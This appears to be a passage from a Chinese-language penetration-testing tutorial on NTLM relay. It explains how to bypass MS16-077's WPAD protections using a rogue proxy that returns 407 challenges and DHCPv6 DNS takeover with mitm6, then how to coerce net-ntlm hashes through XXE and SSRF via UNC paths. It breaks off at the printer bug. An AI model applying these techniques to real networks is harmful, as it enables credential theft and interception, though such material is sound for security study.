+<p>   &#x524D;&#x9762;&#x8BF4;&#x8FC7;&#xFF0C;&#x9488;&#x5BF9;&#x5728;&#x67E5;&#x8BE2;WPAD&#x7684;&#x65F6;&#x5019;&#x8FDB;&#x884C;&#x6295;&#x6BD2;&#x6B3A;&#x9A97;&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#xFF0C;&#x5FAE;&#x8F6F;&#x6DFB;&#x52A0;&#x4E86;&#x4E24;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x4FDD;&#x62A4;&#x63AA;&#x65BD;</p>
+<p>   1&#x3001;&#x7CFB;&#x7EDF;&#x518D;&#x4E5F;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;&#x5E7F;&#x64AD;&#x534F;&#x8BAE;&#x6765;&#x89E3;&#x6790;WPAD&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x4F7F;&#x7528;DHCP&#x6216;DNS&#x534F;&#x8BAE;&#x5B8C;&#x6210;&#x8BE5;&#x4EFB;&#x52A1;&#x3002;</p>
+<p>   2&#x3001;&#x66F4;&#x6539;&#x4E86;PAC&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x7684;&#x9ED8;&#x8BA4;&#x884C;&#x4E3A;&#xFF0C;&#x4EE5;&#x4FBF;&#x5F53;WinHTTP&#x8BF7;&#x6C42;PAC&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x53D1;&#x9001;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x57DF;&#x51ED;&#x636E;&#x6765;&#x54CD;&#x5E94;NTLM&#x6216;&#x534F;&#x5546;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x8D28;&#x8BE2;&#x3002;</p>
+<p>   &#x7B2C;&#x4E8C;&#x4E2A;&#x4FDD;&#x62A4;&#x63AA;&#x65BD;&#x6BD4;&#x8F83;&#x597D;&#x7ED5;&#x8FC7;&#xFF0C;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x7ED5;&#x8FC7;&#x8FD9;&#x4E2A;&#x3002;<code>&#x66F4;&#x6539;&#x4E86;PAC&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x7684;&#x9ED8;&#x8BA4;&#x884C;&#x4E3A;&#xFF0C;&#x4EE5;&#x4FBF;&#x5F53;WinHTTP&#x8BF7;&#x6C42;PAC&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x53D1;&#x9001;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x57DF;&#x51ED;&#x636E;&#x6765;&#x54CD;&#x5E94;NTLM&#x6216;&#x534F;&#x5546;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x8D28;&#x8BE2;&#x3002;</code>&#x8FD9;&#x4E2A;&#x5176;&#x5B9E;&#x6BD4;&#x8F83;&#x597D;&#x89E3;&#x51B3;&#xFF0C;&#x5728;&#x8BBF;&#x95EE;pac&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x6CA1;&#x529E;&#x6CD5;&#x83B7;&#x53D6;&#x5230;&#x7528;&#x6237;&#x7684;net-ntlm hash&#x3002;&#x5176;&#x5B9E;&#x9ED8;&#x8BA4;responder&#x5C31;&#x4E0D;&#x60F3;&#x5728;&#x8FD9;&#x4E00;&#x6B65;&#x83B7;&#x53D6;net-ntlm hash&#xFF0C;&#x4ED6;&#x9ED8;&#x8BA4;&#x4E0D;&#x5F00;&#x542F;&#xFF0C;&#x8981;&#x624B;&#x52A8;&#x52A0;<code>-F</code>&#x9009;&#x9879;&#x624D;&#x80FD;&#x5F00;&#x542F;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7ED9;&#x7528;&#x6237;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6B63;&#x5E38;&#x7684;wpad&#x3002;&#x5C06;&#x4EE3;&#x7406;&#x6307;&#x5411;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x4F5C;&#x4E3A;&#x4E2D;&#x95F4;&#x4EBA;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x505A;&#x7684;&#x4E8B;&#x5C31;&#x5F88;&#x591A;&#x4E86;&#x3002;&#x6BD4;&#x5982;&#x63D2;&#x5165;xss payload&#x83B7;&#x53D6;net-ntlm hash&#xFF0C;&#x4E2D;&#x95F4;&#x4EBA;&#x83B7;&#x53D6;post&#xFF0C;cookie&#x7B49;&#x53C2;&#x6570;&#xFF0C;&#x901A;&#x8FC7;basic&#x8BA4;&#x8BC1;&#x8FDB;&#x884C;&#x9493;&#x9C7C;&#xFF0C;&#x8BF1;&#x5BFC;&#x4E0B;&#x8F7D;exe&#x7B49;&#x7B49;&#x3002;&#x8FD9;&#x4E2A;&#x53EF;&#x4EE5;&#x56DE;&#x53BB;&#x4E0A;&#x4E00;&#x5C0F;&#x8282;<code>&#x914D;&#x5408;LLMNR/NBNS&#x6295;&#x6BD2;</code>&#x770B;&#x770B;&#x3002;</p>
+<p>&#x5728;&#x7F51;&#x4E0A;&#x4E5F;&#x6709;&#x4E00;&#x79CD;&#x6BD4;&#x8F83;&#x5DE7;&#x5999;&#x7684;&#x7ED5;&#x8FC7;&#x59FF;&#x52BF;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7ED9;&#x7528;&#x6237;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6B63;&#x5E38;&#x7684;wpad&#x3002;&#x5C06;&#x4EE3;&#x7406;&#x6307;&#x5411;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#xFF0C;&#x5F53;&#x53D7;&#x5BB3;&#x4E3B;&#x673A;&#x8FDE;&#x63A5;&#x5230;&#x6211;&#x4EEC;&#x7684;&#x201C;&#x4EE3;&#x7406;&#x201D;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;HTTP CONNECT&#x52A8;&#x4F5C;&#x3001;&#x6216;&#x8005;GET&#x8BF7;&#x6C42;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x5B8C;&#x6574;URI&#x8DEF;&#x5F84;&#x6765;&#x8BC6;&#x522B;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF0C;&#x7136;&#x540E;&#x56DE;&#x590D;HTTP 407&#x9519;&#x8BEF;&#xFF08;&#x9700;&#x8981;&#x4EE3;&#x7406;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF09;&#xFF0C;&#x8FD9;&#x4E0E;401&#x4E0D;&#x540C;&#xFF0C;IE/Edge&#x4EE5;&#x53CA;Chrome&#x6D4F;&#x89C8;&#x5668;&#xFF08;&#x4F7F;&#x7528;&#x7684;&#x662F;IE&#x8BBE;&#x7F6E;&#xFF09;&#x4F1A;&#x81EA;&#x52A8;&#x4E0E;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x8EAB;&#x4EFD;&#x8BA4;&#x8BC1;&#xFF0C;&#x5373;&#x4F7F;&#x5728;&#x6700;&#x65B0;&#x7248;&#x672C;&#x7684;Windows&#x7CFB;&#x7EDF;&#x4E0A;&#x4E5F;&#x662F;&#x5982;&#x6B64;&#x3002;&#x5728;Firefox&#x4E2D;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x914D;&#x7F6E;&#x8FD9;&#x4E2A;&#x9009;&#x9879;&#xFF0C;&#x8BE5;&#x9009;&#x9879;&#x9ED8;&#x8BA4;&#x5904;&#x4E8E;&#x542F;&#x7528;&#x72B6;&#x6001;&#x3002;</p>
+<p>   &#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x4EFB;&#x52A1;&#x662F;&#x8981;&#x6765;&#x7ED5;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A;&#x4FDD;&#x62A4;&#x63AA;&#x65BD;</p>
+<pre><code>   &#x7CFB;&#x7EDF;&#x518D;&#x4E5F;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;&#x5E7F;&#x64AD;&#x534F;&#x8BAE;&#x6765;&#x89E3;&#x6790;WPAD&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x4F7F;&#x7528;DHCP&#x9009;&#x9879;&#x6216;DNS&#x534F;&#x8BAE;&#x5B8C;&#x6210;&#x8BE5;&#x4EFB;&#x52A1;&#x3002;
+</code></pre><p>   &#x8FD9;&#x4E2A;&#x5C31;&#x4FDD;&#x8BC1;&#x4E86;llmnr&#x6295;&#x6BD2;&#x548C;nbns&#x6295;&#x6BD2;&#x4E0D;&#x80FD;&#x7528;&#x4E86;&#x3002;&#x6211;&#x4EEC;&#x6765;&#x56DE;&#x987E;&#x4E0B;&#x7528;&#x6237;&#x83B7;&#x53D6;pac&#x6587;&#x4EF6;&#x7684;&#x4E00;&#x822C;&#x6D41;&#x7A0B;&#x3002;</p>
+<ol>
+<li><p>&#x901A;&#x8FC7;DHCP&#x670D;&#x52A1;&#x5668;</p>
+</li>
+<li><p>&#x67E5;&#x8BE2;WPAD&#x4E3B;&#x673A;&#x7684;IP</p>
+<ul>
+<li><p>Hosts</p>
+</li>
+<li><p>DNS (cache / server) </p>
+</li>
+<li><p>LLMNR</p>
+</li>
+<li><p>NBNS </p>
+</li>
+</ul>
+<p>&#x5728;<a href="https://support.microsoft.com/en-us/help/3165191/ms16-077-security-update-for-wpad-june-14--2016" target="_blank">MS16-077</a>&#x4E4B;&#x540E;&#xFF0C;&#x901A;&#x8FC7;DHCP&#x548C;DNS&#x534F;&#x8BAE;&#x8FD8;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;pac&#x6587;&#x4EF6;&#x3002;</p>
+<p>DHCP&#x548C;DNS&#x90FD;&#x6709;&#x6307;&#x5B9A;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E0D;&#x662F;&#x901A;&#x8FC7;&#x5E7F;&#x64AD;&#x5305;&#xFF0C;&#x800C;&#x4E14;dhcp&#x670D;&#x52A1;&#x5668;&#x548C;dns&#x670D;&#x52A1;&#x5668;&#x6211;&#x4EEC;&#x662F;&#x4E0D;&#x53EF;&#x63A7;&#x7684;&#xFF0C;&#x6CA1;&#x6CD5;&#x8FDB;&#x884C;&#x6295;&#x6BD2;&#x3002;</p>
+<p>&#x5E78;&#x8FD0;&#x7684;&#x662F;&#x5B89;&#x5168;&#x7814;&#x7A76;&#x4EBA;&#x5458;&#x5E76;&#x4E0D;&#x5C06;&#x76EE;&#x5149;&#x5C40;&#x9650;&#x5728;ipv4&#xFF0C;&#x4ECE;Windows Vista&#x4EE5;&#x6765;&#xFF0C;&#x6240;&#x6709;&#x7684;Windows&#x7CFB;&#x7EDF;&#xFF08;&#x5305;&#x62EC;&#x670D;&#x52A1;&#x5668;&#x7248;&#x7CFB;&#x7EDF;&#xFF09;&#x90FD;&#x4F1A;&#x542F;&#x7528;IPv6&#x7F51;&#x7EDC;&#xFF0C;&#x5E76;&#x4E14;&#x5176;&#x4F18;&#x5148;&#x7EA7;&#x8981;&#x9AD8;&#x4E8E;IPv4&#x7F51;&#x7EDC;&#x3002;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x8981;&#x7528;&#x5230;DHCPV6&#x534F;&#x8BAE;&#x3002;</p>
+<p>DHCPv6&#x534F;&#x8BAE;&#x4E2D;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x901A;&#x8FC7;&#x5411;&#x7EC4;&#x64AD;&#x5730;&#x5740;&#x53D1;&#x9001;Solicit&#x62A5;&#x6587;&#x6765;&#x5B9A;&#x4F4D;DHCPv6&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x7EC4;&#x64AD;&#x5730;&#x5740;[ff02::1:2]&#x5305;&#x62EC;&#x6574;&#x4E2A;&#x5730;&#x5740;&#x94FE;&#x8DEF;&#x8303;&#x56F4;&#x5185;&#x7684;&#x6240;&#x6709;DHCPv6&#x670D;&#x52A1;&#x5668;&#x548C;&#x4E2D;&#x7EE7;&#x4EE3;&#x7406;&#x3002;DHCPv6&#x56DB;&#x6B65;&#x4EA4;&#x4E92;&#x8FC7;&#x7A0B;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5411;[ff02::1:2]&#x7EC4;&#x64AD;&#x5730;&#x5740;&#x53D1;&#x9001;&#x4E00;&#x4E2A;Solicit&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#xFF0C;DHCP&#x670D;&#x52A1;&#x5668;&#x6216;&#x4E2D;&#x7EE7;&#x4EE3;&#x7406;&#x56DE;&#x5E94;Advertise&#x6D88;&#x606F;&#x544A;&#x77E5;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x9009;&#x62E9;&#x4F18;&#x5148;&#x7EA7;&#x6700;&#x9AD8;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5E76;&#x53D1;&#x9001;Request&#x4FE1;&#x606F;&#x8BF7;&#x6C42;&#x5206;&#x914D;&#x5730;&#x5740;&#x6216;&#x5176;&#x4ED6;&#x914D;&#x7F6E;&#x4FE1;&#x606F;&#xFF0C;&#x6700;&#x540E;&#x670D;&#x52A1;&#x5668;&#x56DE;&#x590D;&#x5305;&#x542B;&#x786E;&#x8BA4;&#x5730;&#x5740;&#xFF0C;&#x59D4;&#x6258;&#x524D;&#x7F00;&#x548C;&#x914D;&#x7F6E;&#xFF08;&#x5982;&#x53EF;&#x7528;&#x7684;DNS&#x6216;NTP&#x670D;&#x52A1;&#x5668;&#xFF09;&#x7684;Relay&#x6D88;&#x606F;&#x3002;&#x901A;&#x4FD7;&#x70B9;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#xFF0C;&#x5728;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;ipv6&#x7684;&#x60C5;&#x51B5;(Windows Vista&#x4EE5;&#x540E;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;),&#x653B;&#x51FB;&#x8005;&#x80FD;&#x63A5;&#x6536;&#x5230;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x7684;dhcpv6&#x7EC4;&#x64AD;&#x5305;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x6700;&#x540E;&#x53EF;&#x4EE5;&#x8BA9;&#x53D7;&#x5BB3;&#x8005;&#x7684;DNS&#x8BBE;&#x7F6E;&#x4E3A;&#x653B;&#x51FB;&#x8005;&#x7684;IPv6&#x5730;&#x5740;&#x3002;</p>
+<p>Fox-IT&#x516C;&#x5E03;&#x4E86;&#x540D;&#x4E3A;<a href="https://github.com/fox-it/mitm6.git" target="_blank">mitm6</a>&#x7684;&#x4E00;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x4EE5;&#x5B9E;&#x65BD;&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x3002;</p>
+<p>mitm6&#x9996;&#x5148;&#x4FA6;&#x542C;&#x653B;&#x51FB;&#x8005;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x67D0;&#x4E2A;&#x7F51;&#x5361;&#x4E0A;&#x7684;DHCPV6&#x6D41;&#x91CF;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124220556305.png" alt="image-20191124220556305"></p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124221019465.png" alt="image-20191124221019465"></p>
+<p>&#x5F53;&#x76EE;&#x6807;&#x8BA1;&#x7B97;&#x673A;&#x91CD;&#x542F;&#x6216;&#x91CD;&#x65B0;&#x8FDB;&#x884C;&#x7F51;&#x7EDC;&#x914D;&#x7F6E;&#xFF08;&#x5982;&#x91CD;&#x65B0;&#x63D2;&#x5165;&#x7F51;&#x7EBF;&#xFF09;&#x65F6;&#xFF0C; &#x5C06;&#x4F1A;&#x5411;DHCPv6&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x83B7;&#x53D6;IPv6&#x914D;&#x7F6E;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124211002343.png" alt="image-20191124211002343"></p>
+<p>&#x8FD9;&#x4E2A;&#x65F6;&#x5019;mitm6&#x5C06;&#x56DE;&#x590D;&#x8FD9;&#x4E9B;DHCPv6&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x5728;&#x94FE;&#x63A5;&#x672C;&#x5730;&#x8303;&#x56F4;&#x5185;&#x4E3A;&#x53D7;&#x5BB3;&#x8005;&#x5206;&#x914D;&#x4E00;&#x4E2A;IPv6&#x5730;&#x5740;&#x3002;&#x5C3D;&#x7BA1;&#x5728;&#x5B9E;&#x9645;&#x7684;IPv6&#x7F51;&#x7EDC;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E9B;&#x5730;&#x5740;&#x662F;&#x7531;&#x4E3B;&#x673A;&#x81EA;&#x5DF1;&#x81EA;&#x52A8;&#x5206;&#x914D;&#x7684;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x7531;DHCP&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#xFF0C;&#x4F46;&#x8FD9;&#x4F7F;&#x6211;&#x4EEC;&#x6709;&#x673A;&#x4F1A;&#x5C06;&#x653B;&#x51FB;&#x8005;IP&#x8BBE;&#x7F6E;&#x4E3A;&#x53D7;&#x5BB3;&#x8005;&#x7684;&#x9ED8;&#x8BA4;IPv6 DNS&#x670D;&#x52A1;&#x5668;&#x3002;&#x5E94;&#x5F53;&#x6CE8;&#x610F;&#xFF0C;mitm6&#x5F53;&#x524D;&#x4EC5;&#x9488;&#x5BF9;&#x57FA;&#x4E8E;Windows&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x56E0;&#x4E3A;&#x5176;&#x4ED6;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF08;&#x5982;macOS&#x548C;Linux&#xFF09;&#x4E0D;&#x4F7F;&#x7528;DHCPv6&#x8FDB;&#x884C;DNS&#x670D;&#x52A1;&#x5668;&#x5206;&#x914D;&#x3002;<img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124220520992.png" alt="image-20191124220520992"></p>
+<p>&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x53D7;&#x5BB3;&#x8005;&#x7684;dns &#x670D;&#x52A1;&#x5668;&#x7684;&#x5730;&#x5740;&#x5DF2;&#x7ECF;&#x8BBE;&#x7F6E;&#x4E3A;&#x653B;&#x51FB;&#x8005;&#x7684;IPv6&#x5730;&#x5740;&#x3002;&#x4E00;&#x65E6;&#x53D7;&#x5BB3;&#x673A;&#x5668;&#x5C06;&#x653B;&#x51FB;&#x8005;&#x8BBE;&#x7F6E;&#x4E3A;IPv6 DNS&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5B83;&#x5C06;&#x7ACB;&#x5373;&#x5F00;&#x59CB;&#x67E5;&#x8BE2;&#x7F51;&#x7EDC;&#x7684;WPAD&#x914D;&#x7F6E;&#x3002;&#x7531;&#x4E8E;&#x8FD9;&#x4E9B;DNS&#x67E5;&#x8BE2;&#x662F;&#x53D1;&#x9001;&#x7ED9;&#x653B;&#x51FB;&#x8005;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x653B;&#x51FB;&#x8005;&#x4EC5;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x81EA;&#x5DF1;&#x7684;IP&#x5730;&#x5740;&#x4F5C;&#x4E3A;WPAD&#x5BF9;&#x5E94;&#x7684;IP&#x5730;&#x5740;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124220642802.png" alt="image-20191124220642802"></p>
+<p>&#x81F3;&#x6B64;MS16-077&#x7684;&#x4E24;&#x4E2A;&#x4FDD;&#x62A4;&#x63AA;&#x65BD;&#x90FD;&#x80FD;&#x7ED5;&#x8FC7;&#xFF0C;&#x518D;&#x9047;&#x5230;MS16-077&#x4E4B;&#x540E;&#x7684;&#x673A;&#x5B50;&#x4E0D;&#x59A8;&#x8BD5;&#x8BD5;&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x3002;</p>
+</li>
+</ol>
+<h2 id="0x0a-xxe--ssrf">0x0A XXE &amp;&amp; SSRF</h2>
+<h3 id="1-xxe">1. XXE</h3>
+<p>&#x5728;xxe&#x91CC;&#x9762;&#x52A0;&#x8F7D;&#x5916;&#x90E8;&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5982;&#x679C;&#x8DEF;&#x5F84;&#x652F;&#x6301;unc&#x8DEF;&#x5F84;&#x7684;&#x8BDD;&#xFF0C;&#x662F;&#x80FD;&#x62FF;&#x5230;net-ntlm  hash&#x7684;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;<code>javajavax.xml.parsers</code>&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;,&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#x5982;&#x4E0B;</p>
+<pre><code class="lang-java"> DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+ DocumentBuilder db = dbf.newDocumentBuilder();
+ Document doc = db.parse(request.getInputStream());
+</code></pre>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122170712455.png" alt="image-20191122170712455"></p>
+<p>&#x6210;&#x529F;&#x6253;&#x56DE;net-ntlm  hash</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122170801821.png" alt="image-20191122170801821"></p>
+<p>&#x5982;&#x679C;&#x4E0D;&#x652F;&#x6301;UNC&#xFF0C;&#x53EF;&#x518D;&#x6D4B;&#x8BD5;http&#x534F;&#x8BAE;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122171229363.png" alt="image-20191122171229363"></p>
+<p>&#x6210;&#x529F;&#x6253;&#x56DE;net-ntlm  hash&#x3002;</p>
+<h3 id="2-ssrf">2. SSRF</h3>
+<p>&#x5728;ssrf&#x91CC;&#x9762;&#x5982;&#x679C;&#x652F;&#x6301;file&#x534F;&#x8BAE;&#xFF0C;&#x5E76;&#x4E14;file&#x534F;&#x8BAE;&#x80FD;&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;&#x8D44;&#x6E90;&#x7684;&#x8BDD;&#xFF0C;&#x662F;&#x80FD;&#x62FF;&#x5230;net-ntlm  hash&#x7684;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;JAVA&#x7684;HttpURLConnection&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#xFF0C;&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#x5982;&#x4E0B;</p>
+<pre><code>URL u = new URL(url);
+URLConnection urlConnection = u.openConnection();
+HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;
+BufferedReader in = new BufferedReader(new InputStreamReader(httpUrl.getInputStream()));
+</code></pre><p>&#x5F53;&#x53EA;&#x652F;&#x6301;HTTP&#x534F;&#x8BAE;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E5F;&#x662F;&#x53EF;&#x80FD;&#x6253;&#x56DE;net-ntlm  hash&#x7684;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122171803694.png" alt="image-20191122171803694">
+&#x6210;&#x529F;&#x6253;&#x56DE;net-ntlm  hash</p>
+<p>&#x5404;&#x4E2A;&#x8BED;&#x8A00;&#x89E6;&#x53D1;XXE&#x548C;SSRF&#x7684;&#x5B9E;&#x73B0;&#x4E0D;&#x540C;&#x3002;&#x540C;&#x4E00;&#x95E8;&#x8BED;&#x8A00;&#x4E5F;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x89E6;&#x53D1;&#x65B9;&#x5F0F;&#xFF0C;&#x8FD9;&#x91CC;&#x5E76;&#x6CA1;&#x6709;&#x4E00;&#x4E00;&#x6D4B;&#x8BD5;&#x3002;</p>
+<p>&#x53EA;&#x8981;&#x652F;&#x6301;UNC&#x8DEF;&#x5F84;&#x90FD;&#x80FD;&#x6253;&#x56DE;net-ntlm hash,&#x5982;&#x679C;&#x652F;&#x6301;http&#x7684;&#x8BDD;&#xFF0C;&#x5F97;&#x770B;&#x5E95;&#x5C42;&#x5B9E;&#x73B0;&#xFF0C;&#x6709;&#x4E9B;&#x5E95;&#x5C42;&#x5B9E;&#x73B0;&#x662F;&#x9700;&#x8981;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5728;&#x4FE1;&#x4EFB;&#x57DF;&#x7684;&#xFF0C;&#x6709;&#x4E9B;&#x5E95;&#x5C42;&#x5B9E;&#x73B0;&#x662F;&#x4E0D;&#x9700;&#x8981;&#x5224;&#x65AD;&#x662F;&#x5426;&#x4FE1;&#x4EFB;&#x57DF;&#xFF0C;&#x6709;&#x4E9B;&#x9700;&#x8981;&#x5224;&#x65AD;&#x662F;&#x5426;&#x4FE1;&#x4EFB;&#x57DF;&#x91CC;&#x9762;&#xFF0C;&#x4F46;&#x662F;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5728;&#x4FE1;&#x4EFB;&#x57DF;&#x7684;&#x4EE3;&#x7801;&#x662F;&#x8FD9;&#x6837;&#x3002;</p>
+<pre><code class="lang-java"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DefaultNTLMAuthenticationCallback</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">NTLMAuthenticationCallback</span> </span>{
+<span class="hljs-meta">@Override</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isTrustedSite</span><span class="hljs-params">(URL url)</span> </span>{ <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>; }
+}
+</code></pre>
+<p>&#x5728;xxe&#x548C;ssrf&#x6D4B;&#x8BD5;&#x4E2D;&#x4E00;&#x822C;&#x8981;&#x6D4B;&#x8BD5;&#x8FD9;&#x4E24;&#x4E2A;&#x65B9;&#x9762;</p>
+<ol>
+<li>&#x652F;&#x4E0D;&#x652F;&#x6301;UNC&#x8DEF;&#x5F84;&#xFF0C;&#x6BD4;&#x5982;<code>\\ip\x</code>&#x6216;&#x8005;<code>file://ip/x</code></li>
+<li>&#x652F;&#x4E0D;&#x652F;&#x6301;HTTP(&#x8FD9;&#x4E2A;&#x4E00;&#x822C;&#x652F;&#x6301;),&#x662F;&#x4E0D;&#x662F;&#x9700;&#x8981;&#x4FE1;&#x4EFB;&#x57DF;&#xFF0C;&#x4FE1;&#x4EFB;&#x57DF;&#x662F;&#x600E;&#x4E48;&#x5224;&#x65AD;&#x7684;</li>
+</ol>
+<p>&#x5404;&#x4E2A;&#x8BED;&#x8A00;&#xFF0C;&#x5404;&#x4E2A;&#x6A21;&#x5757;&#x7684;&#x6D4B;&#x8BD5;&#xFF0C;&#x8FD9;&#x91CC;&#x5E76;&#x6CA1;&#x6709;&#x4E00;&#x4E00;&#x6D4B;&#x8BD5;&#x3002;</p>
+<h2 id="0x0b-&#x6253;&#x5370;&#x673A;&#x6F0F;&#x6D1E;">0x0B &#x6253;&#x5370;&#x673A;&#x6F0F;&#x6D1E;</h2>
+<p>Windows&#x7684;MS-RPRN&#x534F;&#x8BAE;&#x7528;&#x4E8E;&#x6253;&#x5370;&#x5BA2;&#x6237;&#x673A;&#x548C;&#x6253;&#x5370;&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x542F;&#x7528;&#x7684;&#x3002;&#x534F;&#x8BAE;&#x5B9A;&#x4E49;&#x7684;RpcRemoteFindFirstPrinterChangeNotificationEx()&#x8C03;&#x7528;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;&#x66F4;&#x6539;&#x901A;&#x77E5;&#x5BF9;&#x8C61;&#xFF0C;&#x8BE5;&#x5BF9;&#x8C61;&#x76D1;&#x89C6;&#x5BF9;&#x6253;&#x5370;&#x673A;&#x5BF9;&#x8C61;&#x7684;&#x66F4;&#x6539;&#xFF0C;&#x5E76;&#x5C06;&#x66F4;&#x6539;&#x901A;&#x77E5;&#x53D1;&#x9001;&#x5230;&#x6253;&#x5370;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</p>
